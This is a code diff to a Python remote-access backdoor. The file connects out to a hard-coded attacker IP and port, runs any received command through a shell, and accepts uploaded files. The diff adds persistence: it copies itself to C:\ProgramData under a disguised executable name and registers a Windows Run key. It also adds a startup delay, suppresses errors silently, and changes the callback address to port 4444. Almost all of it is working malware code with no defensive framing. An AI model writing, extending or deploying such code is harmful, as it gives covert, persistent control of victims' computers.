@@ -4,13 +4,18 @@ import json
 import os
 import base64
 import sys
+import shutil
+import time
 
 
 class Backdoor:
     def __init__(self, ip, port):
+        try:
+            self.make_persistence()
+        except Exception:
+            pass
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.s.connect((ip, port))
-
 
     def execute(self, commands):
         return subprocess.check_output(commands, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
@@ -41,8 +46,13 @@ class Backdoor:
             file.write(base64.b64decode(content))
             return "[+] Upload Successful"
 
+    def make_persistence(self):
+        location = r"C:\ProgramData\Internet31.exe"
+        if not os.path.exists(location):
+            shutil.copy(sys.executable, location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v rand25323 /t REG_SZ /d "' + location + '"')
+
     def run(self):
-        result = ""
         while True:
             try:
                 commands = self.recv_reliably()
@@ -71,5 +81,9 @@ class Backdoor:
             self.send_reliably(result)  # here result is in byte format as subprocess returns in byte format
 
 
-my_backdoor = Backdoor("192.168.43.13", 8080)
-my_backdoor.run()  # To run the program
+try:
+    time.sleep(15)
+    my_backdoor = Backdoor("192.168.43.237", 4444)
+    my_backdoor.run()  # To run the program
+except Exception:
+    sys.exit()
